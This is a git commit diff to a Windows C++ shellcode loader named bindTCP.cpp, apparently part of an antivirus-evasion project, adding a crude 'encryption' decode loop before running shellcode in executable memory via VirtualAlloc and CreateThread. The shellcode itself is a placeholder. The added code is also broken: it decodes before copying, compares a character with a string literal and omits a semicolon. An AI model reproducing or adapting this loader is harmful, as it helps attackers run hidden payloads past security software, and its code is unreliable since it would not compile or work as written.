47405d7eab82260d477b6fb72144375ddfce3a7e
David <156260369+korrectional@users.noreply.github.com>
2024-05-10 08:39:41 -0400

    Update bindTCP.cpp
    Added some encription methods

--- shellcode injection - 0xpat/bindTCP.cpp
+++ shellcode injection - 0xpat/bindTCP.cpp
@@ -13,9 +13,22 @@ This program has less debugging stuff, but it (soon) contains tricks to bypass v
 
 
 void main()
-{
-	const char shellcode[] = "(yer shellcode here)";
+{	// Encripted shellcode should have all x's as zeta's and then ceazared by 13
+	const char shellcode[] = "(yer encripted shellcode here)";
 	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	for (int i = 0; i < sizeof(shellcode); i++)//Decript
+	{
+		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
+	}
+	for (int i=0; i<sizeof(shellcode); i++)
+	{
+		if(((char*)shellcode_exec)[i] == "zeta")
+		{
+			((char*)shellcode_exec)[i] = "x"
+		}
+	}
+	
 	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
 	DWORD threadID;
 	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
